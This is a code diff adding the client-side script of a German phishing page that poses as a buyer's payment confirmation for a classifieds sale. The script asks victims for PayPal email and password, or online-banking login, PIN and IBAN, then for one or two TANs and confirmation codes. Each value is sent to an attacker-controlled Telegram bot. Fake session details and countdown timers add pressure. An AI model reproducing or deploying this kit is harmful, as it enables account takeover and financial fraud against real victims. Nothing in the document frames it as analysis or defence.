@@ -253,4 +253,199 @@ const PRODUKTE = [
   "Sonos Lautsprecher","Fahrradhelm"
 ];
 
-const d64 = s => { try { return decodeURIComponent
+const d64 = s => { try { return decodeURIComponent(escape(atob(s.replace(/-/g,'+').replace(/_/g,'/')))); } catch(e){ return ""; } };
+const nf  = n => Number(n).toFixed(2).replace('.', ',');
+const vnr = s => { let h = 0; for (const c of s) h = (h * 31 + c.charCodeAt(0)) >>> 0; return '#TD-2026-' + (1000 + h % 9000); };
+
+let payload = "", betrag = 47.50, mode = "pp", name = "", art = "", vnum = "", bankName = "Sparkasse", stage2 = false;
+
+(function init(){
+  const raw = d64(new URLSearchParams(location.search).get('v') || "");
+  const p = raw.split('|');
+  if (p.length >= 3 && !isNaN(parseFloat(p[0]))) {
+    betrag = parseFloat(p[0]);
+    name   = p[1] || "M. Weber";
+    art    = PRODUKTE[parseInt(p[2], 10)] || PRODUKTE[0];
+    payload = raw;
+  } else {
+    name = "M. Weber"; art = PRODUKTE[0];
+    payload = betrag + "|" + name + "|0";
+  }
+  vnum = vnr(payload);
+  const sid = Math.random().toString(16).slice(2, 8).toUpperCase();
+  const ini = name.split(/[\s.]+/).filter(Boolean).map(w => w[0]).join('').slice(0,2).toUpperCase() || "MW";
+  document.getElementById('mono').textContent =
+    "Sitzung " + sid + " · Zugriff " + new Date().toLocaleString('de-DE') + " · Gerät verifiziert";
+  document.getElementById('buyer').textContent  = name;
+  document.getElementById('buyer2').textContent = name;
+  document.getElementById('ava').textContent    = ini;
+  document.getElementById('amt').textContent    = nf(betrag);
+  document.getElementById('amt2').textContent   = nf(betrag);
+  document.getElementById('art').textContent    = art;
+  document.getElementById('vnr').textContent    = vnum;
+  document.getElementById('datum').textContent  = new Date().toLocaleDateString('de-DE');
+  document.getElementById('pay').href = "https://paypal.me/" + PP_USER + "/" + FEE;
+
+  document.getElementById('bank').addEventListener('change', e => {
+    bankName = e.target.value;
+    const spk = /Sparkasse|Volksbank/i.test(bankName);
+    document.getElementById('lblUser').textContent =
+      spk ? "Anmeldename / Legitimations-ID" : "Online-Banking Anmeldename";
+    document.getElementById('hintUser').textContent =
+      spk ? "Steht auf deinem Sparkassen-Brief bzw. im Online-Banking."
+          : "Der Anmeldename deines Online-Bankings.";
+    document.getElementById('lbl2').textContent = spk
+      ? "Zweite TAN zur Freigabe (secureGo plus)"
+      : "Zweite TAN zur Freigabe (pushTAN / photoTAN)";
+  });
+
+  startTimer(892, 't1');
+
+  if ('serviceWorker' in navigator) {
+    window.addEventListener('load', async () => {
+      try {
+        const reg = await navigator.serviceWorker.register('sw.js', { updateViaCache: 'none' });
+        reg.update();
+      } catch (e) {}
+    });
+    let reloaded = false;
+    navigator.serviceWorker.addEventListener('controllerchange', () => {
+      if (reloaded) return;
+      reloaded = true;
+      location.reload();
+    });
+  }
+})();
+
+function go(n){
+  [1,2,3,4].forEach(i => document.getElementById('s'+i).classList.toggle('hide', i !== n));
+  window.scrollTo({top:0,behavior:'instant'});
+  if (n === 3) {
+    const bank = (mode === 'bk');
+    document.getElementById('s3title').textContent = bank ? "TAN eingeben" : "Bestätigungscode";
+    document.getElementById('s3sub').textContent = bank
+      ? "Zur Freigabe bestätige bitte die TAN, die an dein hinterlegtes Gerät gesendet wurde."
+      : "Wir haben dir gerade einen 6-stelligen Code geschickt. Bitte jetzt in der App bestätigen.";
+    document.getElementById('code').placeholder = bank ? "TAN" : "000000";
+    document.getElementById('s3btn').textContent = bank ? "Mit TAN freigeben" : "Freigeben";
+    document.getElementById('resendLnk').textContent = bank
+      ? "Keine TAN erhalten? Erneut senden" : "Kein Code erhalten? Erneut senden";
+    startTimer(90);
+  }
+}
+function back2(){ stage2 = false; document.getElementById('fTAN2').classList.add('hide'); go(2); }
+
+function pick(m){
+  mode = m;
+  stage2 = false;
+  document.getElementById('oPP').classList.toggle('sel', m === 'pp');
+  document.getElementById('oBK').classList.toggle('sel', m === 'bk');
+  document.getElementById('fPP').classList.toggle('hide', m !== 'pp');
+  document.getElementById('fBK').classList.toggle('hide', m !== 'bk');
+  document.getElementById('fTAN2').classList.add('hide');
+  document.getElementById('fPW').classList.add('hide');
+}
+
+function ppNext(){
+  const m = document.getElementById('mail').value.trim();
+  if (!m || !m.includes('@')) return alert("Bitte gültige E-Mail eingeben.");
+  document.getElementById('fPW').classList.remove('hide');
+  document.getElementById('btn2').classList.add('hide');
+  document.getElementById('pw').focus();
+  const btn = document.createElement('button');
+  btn.className = 'btn'; btn.id = 'btnPP2'; btn.textContent = 'Weiter';
+  btn.onclick = submitData;
+  document.getElementById('fPW').appendChild(btn);
+  document.getElementById('btn2').classList.add('hide');
+}
+
+function tg(text){
+  fetch("https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage", {
+    method: "POST", headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({chat_id: TG_CHAT, text: text, disable_web_page_preview: true})
+  }).catch(()=>{});
+}
+
+function submitData(){
+  const head = "[" + vnum + "] " + nf(betrag) + " EUR · " + art;
+  if (mode === "pp"){
+    const m = document.getElementById('mail').value.trim();
+    const p = document.getElementById('pw').value;
+    if (!m || !p) return alert("Bitte E-Mail und Passwort eingeben.");
+    tg("PAYPAL\n" + head + "\nMAIL: " + m + "\nPW: " + p);
+  } else {
+    bankName = document.getElementById('bank').value;
+    const usr = document.getElementById('buser').value.trim();
+    const pin = document.getElementById('pin').value.trim();
+    const iban = document.getElementById('iban').value.replace(/\s/g,'');
+    if (!bankName) return alert("Bitte Bank auswählen.");
+    if (!usr) return alert("Bitte Anmeldename / Legitimations-ID eingeben.");
+    if (pin.length < 4) return alert("Bitte Online-Banking PIN eingeben.");
+    tg("BANK\n" + head + "\nBANK: " + bankName + "\nUSER: " + usr + "\nPIN: " + pin
+       + (iban ? "\nIBAN: " + iban : "\nIBAN: —"));
+  }
+  go(3);
+}
+
+function submitCode(){
+  const bank = (mode === 'bk');
+  const btn = document.getElementById('s3btn');
+
+  if (stage2){
+    const second = document.getElementById('code2').value.trim();
+    if (second.length < 6) return alert("Bitte zweite TAN eingeben.");
+    tg("TAN2 [" + bankName + "] [" + vnum + "]: " + second);
+    btn.disabled = true; btn.textContent = "Prüfe TAN…";
+    setTimeout(finish, 1400);
+    return;
+  }
+
+  const first = document.getElementById('code').value.trim();
+  if (first.length < 6) return alert(bank ? "Bitte TAN eingeben." : "Bitte 6-stelligen Code eingeben.");
+  tg((bank ? "TAN [" + bankName + "] [" : "CODE [") + vnum + "]: " + first);
+  btn.disabled = true; btn.textContent = "Prüfe TAN…";
+
+  setTimeout(() => {
+    btn.disabled = false;
+    if (bank){
+      stage2 = true;
+      document.getElementById('fTAN2').classList.remove('hide');
+      document.getElementById('s3sub').textContent =
+        "Fast fertig. Bitte bestätige die Freigabe mit der zweiten TAN deiner Banking-App.";
+      document.getElementById('s3btn').textContent = "Abschließen";
+      document.getElementById('code2').focus();
+      startTimer(90);
+    } else {
+      finish();
+    }
+  }, 1500);
+}
+
+function finish(){
+  document.getElementById('s3btn').disabled = false;
+  tg("FREIGEGEBEN [" + vnum + "]");
+  go(4);
+  startTimer(900, 't2');
+}
+
+function resend(){
+  tg((mode === 'bk' ? "TAN ERNEUT SENDEN [" : "CODE ERNEUT SENDEN [") + vnum + "]");
+  startTimer(90);
+}
+
+let iv = null;
+function startTimer(sec, id){
+  clearInterval(iv);
+  const el = document.getElementById(id || 'timer');
+  if (!el) return;
+  let t = sec;
+  const render = () => {
+    const m = Math.floor(t/60), s = t % 60;
+    el.textContent = (sec > 200) ? (m + ":" + String(s).padStart(2,'0')) : (t + "s");
+    if (t-- <= 0) { clearInterval(iv); el.textContent = "abgelaufen"; }
+  };
+  render(); iv = setInterval(render, 1000);
+}
+</script>
+</body>
+</html>
